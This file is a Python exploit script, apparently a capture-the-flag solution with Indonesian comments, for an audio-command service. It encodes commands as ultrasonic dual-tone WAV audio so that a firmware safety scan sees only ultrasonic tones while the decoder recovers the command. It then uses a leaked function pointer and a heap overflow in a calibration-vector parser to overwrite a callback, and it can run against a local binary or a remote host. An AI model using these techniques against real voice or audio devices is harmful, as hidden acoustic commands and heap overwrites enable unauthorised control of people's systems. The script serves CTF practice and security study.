#!/usr/bin/env python3
import argparse
import base64
import io
import math
import os
import re
import socket
import subprocess
import sys
import wave

FS = 96_000
CODEC_FS = 16_000
UPSAMPLE = FS // CODEC_FS
SYMBOL_CODEC_SAMPLES = 200
SYMBOL_SAMPLES = SYMBOL_CODEC_SAMPLES * UPSAMPLE
LEAD_SAMPLES = 64 * UPSAMPLE
CARRIER = 20_000
AMP = 0.25


def build_frame(payload: bytes) -> bytes:
    if len(payload) > 255:
        raise ValueError("payload too long for one acoustic frame")

    cksum = len(payload)
    for b in payload:
        cksum ^= b

    return bytes([0xA5, 0x5A, len(payload)]) + payload + bytes([cksum])


def acoustic_wav_b64(payload: bytes, amp: float = AMP, carrier: int = CARRIER) -> bytes:
    """
    Encode command payload jadi WAV ultrasonic dual-tone.

    Safety scan firmware jalan sebelum model transducer nonlinear,
    jadi yang kebaca guard cuma tone ultrasonic.

    Setelah masuk pipeline decoder, term quadratic bikin difference tone:
        (carrier + tone) - carrier = tone

    Tone hasil difference inilah yang akhirnya diparse sebagai command.
    """
    frame = build_frame(payload)
    samples = [0] * LEAD_SAMPLES

    for b in frame:
        for nib in ((b >> 4) & 0xF, b & 0xF):
            tone = 800 + 80 * nib

            for n in range(SYMBOL_SAMPLES):
                t = n / FS
                v = amp * (
                    math.sin(2 * math.pi * carrier * t)
                    + math.sin(2 * math.pi * (carrier + tone) * t)
                )

                v = max(-0.99, min(0.99, v))
                samples.append(int(v * ((1 << 23) - 1)))

    # Tail silence kecil. Payload masih di bawah limit 2 detik.
    samples.extend([0] * (FS // 50))

    raw = bytearray()
    for s in samples:
        if s < 0:
            s += 1 << 24
        raw += int(s).to_bytes(3, "little", signed=False)

    bio = io.BytesIO()
    with wave.open(bio, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(3)
        w.setframerate(FS)
        w.writeframes(raw)

    return base64.b64encode(bio.getvalue()) + b"\n"


def tlv_select_factory() -> bytes:
    """
    TLV command:
      type 0x01 = SELECT_PROFILE
      len  0x01
      val  0x0e = factory/diagnostic profile
    """
    return bytes([0x01, 0x01, 0x0E])


def tlv_overwrite_object(diag_func_addr: int, object_offset: int = 0x30) -> bytes:
    """
    Build SET_CAL_VECTOR payload untuk overflow ke heap object berikutnya.

    Layout yang dipakai binary:
      malloc(0x20) -> calibration vector
      malloc(0x30) -> object callback

    Di glibc, user pointer chunk kedua berada 0x30 byte setelah user pointer
    chunk pertama. Field pertama object adalah function pointer yang dipanggil
    setelah tiap capture.
    """
    data = bytearray(b"A" * (object_offset + 8))

    # Area ini menimpa metadata chunk berikutnya.
    # Dibuat plausible supaya process tetap stabil.
    data[0x20:0x28] = (0).to_bytes(8, "little")
    data[0x28:0x30] = (0x41).to_bytes(8, "little")

    # Overwrite callback/function pointer object ke fungsi diagnostic unlock.
    data[object_offset:object_offset + 8] = diag_func_addr.to_bytes(8, "little")

    # Parser SET_CAL_VECTOR membaca word 16-bit, jadi panjang dibuat genap.
    if len(data) % 2:
        data.append(0)

    count = len(data) // 2
    value = bytes([count]) + bytes(data)

    # TLV:
    #   type 0x02 = SET_CAL_VECTOR
    #   len  = len(value)
    #   value = count + raw vector bytes
    return bytes([0x02, len(value)]) + value


class LocalTube:
    def __init__(self, path: str):
        env = dict(os.environ)
        env.setdefault("FLAG", "H7CTF{dummy_local_flag}")

        self.p = subprocess.Popen(
            [path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )

    def send(self, data: bytes):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def readline(self) -> bytes:
        return self.p.stdout.readline()

    def close(self):
        try:
            self.p.stdin.close()
        except Exception:
            pass

        self.p.terminate()


class RemoteTube:
    def __init__(self, host: str, port: int):
        # Payload kedua berupa WAV base64 ratusan KB.
        # Timeout 10 detik terlalu pendek kalau remote agak lambat.
        self.s = socket.create_connection((host, port), timeout=60)
        self.f = self.s.makefile("rb", buffering=0)

    def send(self, data: bytes):
        # Wajib sendall untuk payload besar.
        # makefile(...).write() bisa partial write.
        self.s.sendall(data)

    def readline(self) -> bytes:
        return self.f.readline()

    def close(self):
        self.s.close()

def recv_until_sep(tube) -> bytes:
    out = b""

    while True:
        line = tube.readline()
        if not line:
            break

        out += line

        if line.strip() == b"----":
            break

    return out


def exploit(tube) -> str:
    banner = recv_until_sep(tube)
    sys.stdout.write(banner.decode(errors="replace"))

    # Step 1:
    # Pilih factory profile.
    # Response-nya memberi CAL ECHO yang berisi pointer fungsi diagnostic.
    tube.send(acoustic_wav_b64(tlv_select_factory()))
    block1 = recv_until_sep(tube)
    sys.stdout.write(block1.decode(errors="replace"))

    m = re.search(rb"CAL ECHO: ([0-9a-fA-F]+)", block1)
    if not m:
        raise RuntimeError("CAL ECHO leak not found; SELECT_PROFILE probably failed")

    echo = bytes.fromhex(m.group(1).decode())
    diag_func = int.from_bytes(echo[:8], "little")

    print(f"[+] leaked FACTORY DIAG function pointer: {diag_func:#x}")

    # Step 2:
    # Kirim SET_CAL_VECTOR oversized.
    # Payload overflow sampai function pointer object dan menggantinya
    # dengan alamat fungsi diagnostic unlock.
    tube.send(acoustic_wav_b64(tlv_overwrite_object(diag_func)))
    block2 = recv_until_sep(tube)

    text = block2.decode(errors="replace")
    sys.stdout.write(text)

    m = re.search(r"H7CTF\{[^}\n]+\}", text)
    if m:
        print(f"<FLAG>{m.group(0)}</FLAG>")
        return m.group(0)

    raise RuntimeError("flag was not found in service output")


def main():
    ap = argparse.ArgumentParser()

    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--local", metavar="PATH", help="run local aria binary")
    mode.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="connect to remote service")

    args = ap.parse_args()

    if args.local:
        tube = LocalTube(args.local)
    else:
        host, port_s = args.remote
        tube = RemoteTube(host, int(port_s))

    try:
        exploit(tube)
    finally:
        try:
            tube.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
